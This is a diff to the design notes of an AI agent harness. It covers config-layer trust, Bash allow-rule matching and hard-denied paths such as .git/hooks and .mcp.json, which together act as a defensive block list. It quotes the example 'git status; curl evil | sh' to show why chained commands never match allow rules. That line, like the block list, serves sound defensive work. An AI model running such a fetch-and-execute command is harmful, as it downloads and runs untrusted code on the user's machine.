@@ -518,7 +518,7 @@ flowchart LR
     class final result
 ```
 
-Layers: built-in defaults, user `~/.config/harness/config.toml`, project `.harness/config.toml`, environment `HARNESS_*`, CLI flags. Later layers win. Lists of permission rules merge; scalars replace. Errors name the file, key and problem. Unknown keys are errors, so only keys something reads exist: each task adds its own. The project layer is untrusted and passes through the trust gate below. Until the gate exists (T3.4), project config drops `lmstudio.*`, `agent.auto_load` and `permissions.allow` with a notice.
+Layers: built-in defaults, user `~/.config/harness/config.toml`, project `.harness/config.toml`, environment `HARNESS_*`, CLI flags. Later layers win. Lists of permission rules merge; scalars replace. Errors name the file, key and problem. Unknown keys are errors, so only keys something reads exist: each task adds its own. The project layer is untrusted and passes through the trust gate below. Until the gate exists (T3.4), project config drops `lmstudio.*`, `agent.auto_load`, `permissions.allow` and any `permissions.mode` wider than the user's, with a notice.
 
 Variables and flags use dotted keys: `HARNESS_AGENT__MAX_TURN_REQUESTS=20` (double underscore for a dot) and `--config-override agent.max_turn_requests=20`. A value is read as TOML if it parses, else as a string, so `default_model=qwen3.5-4b` works. Keys holding a dot, such as a profile pattern `qwen3.5*`, can only be set in a file. `HARNESS_LOG_CONTENT` is not a config key.
 
@@ -652,7 +652,9 @@ A hook `allow` skips the prompt but can't override `deny` rules or hard denials.
 
 Compatible with Claude Code's: `Tool`, `Tool(glob)`, `mcp__server__tool`. Examples: `Bash(git status*)`, `Edit(src/**)`, `Read(**/.env*)`.
 
-**`Bash` allow rules only match simple commands.** Anything containing `;`, `&`, `|`, `` ` ``, `$(`, `>`, `<`, a newline or `${` never matches an allow rule, and always asks. Otherwise `Bash(git *)` would permit `git status; curl evil | sh`. Deny rules match against the whole string and every simple segment.
+**`Bash` allow rules only match simple commands.** Anything containing `;`, `&`, `|`, `` ` ``, `$(`, `>`, `<`, a newline or `${` never matches an allow rule, and always asks. Otherwise `Bash(git *)` would permit `git status; curl evil | sh`. Deny rules match against the whole string and every simple segment. A command whose text mentions a hard-denied path (`.git/hooks`, `.git/config`, `git config`, `hooksPath`, `.harness`, `.mcp.json`, user config) never matches an allow rule either.
+
+File rules match the path relative to the workspace: `file_path` for `Read`, `Write` and `Edit`, and `path` for the search tools. Deny rules check both the path as written and as resolved, so `..` and symlinks can't step around them. Allow rules check only the resolved path. A deny rule on a file doesn't stop a `Grep` over its folder.
 
 ### Permission prompts
 
